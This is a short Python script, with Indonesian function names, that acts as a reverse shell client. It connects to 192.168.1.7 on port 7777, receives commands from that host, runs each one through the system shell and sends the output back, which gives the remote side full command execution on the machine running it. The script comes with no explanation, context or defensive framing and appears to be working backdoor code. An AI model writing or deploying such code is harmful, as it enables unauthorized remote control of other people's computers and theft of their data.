import socket
import subprocess
from subprocess import PIPE
import os


sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port=7777
host='192.168.1.7'
sock.connect((host,port))


def terima_perintah():
    while True:
        perintahsrv= perintah_server()
        if perintahsrv in ('exit','quit'):
            sock.close()
            break
        elif perintahsrv[:3] == 'cd ':
            os.chdir(perintahsrv[3:])
        elif perintahsrv == 'clear':
            pass
            
        else:
            pros= subprocess.run(perintahsrv,shell=True,capture_output=True)       
            output= pros.stdout.decode('utf-8')+pros.stderr.decode('utf-8')        
            sock.send(output.encode('utf-8'))
    
        
      
def perintah_server():
    while True:
        try:
            data = sock.recv(1024).decode('utf-8')
            return data
        except ValueError:
            continue

terima_perintah()